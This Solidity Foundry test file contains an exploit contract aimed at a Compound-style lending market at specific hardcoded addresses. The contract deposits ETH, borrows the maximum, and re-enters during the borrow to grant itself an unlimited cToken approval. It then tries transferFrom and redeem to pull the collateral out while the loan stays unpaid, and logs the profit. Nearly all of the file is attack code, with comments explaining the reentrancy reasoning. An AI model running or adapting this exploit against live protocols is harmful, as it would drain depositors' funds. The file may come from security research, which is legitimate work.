// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function getCash() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

/// @dev During reentrancy, approve a helper. After borrow completes, helper calls transferFrom.
/// Key insight: approve might NOT have reentrancy guard (it doesn't modify core state).
/// After the borrow tx completes, call transferFrom in a SEPARATE call.
contract Pool72ApproveAttacker {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable public immutable owner;
    bool borrowInFlight;
    bool reentered;
    bool approveSuccess;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function step1_borrowAndApprove() external payable {
        uint256 cash = FETH72.getCash();
        console.log("Cash:", cash);

        FETH72.mint{value: msg.value}();
        console.log("cTokens:", FETH72.balanceOf(address(this)));

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        // Borrow max
        (,uint256 liq,) = COMPTROLLER.getAccountLiquidity(address(this));
        uint256 borrowAmt = liq > cash - 1 ? cash - 1 : liq;
        console.log("Borrow amt:", borrowAmt);

        borrowInFlight = true;
        uint256 result = FETH72.borrow(borrowAmt);
        borrowInFlight = false;

        console.log("Borrow result:", result);
        console.log("Reentered:", reentered);
        console.log("Approve success:", approveSuccess);

        // Check if owner has approval
        uint256 allowance = FETH72.allowance(address(this), owner);
        console.log("Allowance for owner:", allowance);

        // Send borrowed ETH to owner
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;
        console.log("=== REENTRANT - trying approve ===");

        // Try approve - this should NOT have reentrancy guard
        // because it only modifies the allowance mapping
        try FETH72.approve(owner, type(uint256).max) returns (bool success) {
            approveSuccess = success;
            console.log("Approve result:", success);
        } catch Error(string memory reason) {
            console.log("Approve failed:", reason);
        } catch {
            console.log("Approve failed (no reason)");
        }
    }
}

contract Pool72Test7 is Test {
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    function testApproveInReentrancy() public {
        address payable attacker = payable(address(0xBEEF));
        vm.deal(attacker, 500 ether);

        vm.startPrank(attacker);
        Pool72ApproveAttacker a = new Pool72ApproveAttacker(attacker);

        uint256 cash = FETH72.getCash();
        uint256 deposit = cash * 2 + 2 ether;

        uint256 balBefore = attacker.balance;
        a.step1_borrowAndApprove{value: deposit}();

        // Check allowance
        uint256 allowance = FETH72.allowance(address(a), attacker);
        console.log("Post-tx allowance:", allowance);

        if (allowance > 0) {
            // Try transferFrom in a separate call (outside reentrancy)
            uint256 cTokens = FETH72.balanceOf(address(a));
            console.log("Attacker cTokens in contract:", cTokens);

            if (cTokens > 0) {
                // transferFrom - this would bypass the reentrancy guard since we're not in a borrow anymore
                bool transferOk = FETH72.transferFrom(address(a), attacker, cTokens);
                console.log("TransferFrom success:", transferOk);

                if (transferOk) {
                    // But can we redeem? The contract still has a borrow...
                    // Actually, the cTokens are now in OUR account (attacker), not the borrower's
                    // We can redeem from our own account
                    uint256 ourCTokens = FETH72.balanceOf(attacker);
                    console.log("Our cTokens:", ourCTokens);
                    uint256 redeemResult = FETH72.redeem(ourCTokens);
                    console.log("Redeem result:", redeemResult);
                }
            }
        }

        uint256 balAfter = attacker.balance;
        console.log("Balance before:", balBefore);
        console.log("Balance after:", balAfter);
        if (balAfter > balBefore) {
            console.log("PROFIT:", balAfter - balBefore);
        } else {
            console.log("LOSS:", balBefore - balAfter);
        }
        vm.stopPrank();
    }
}
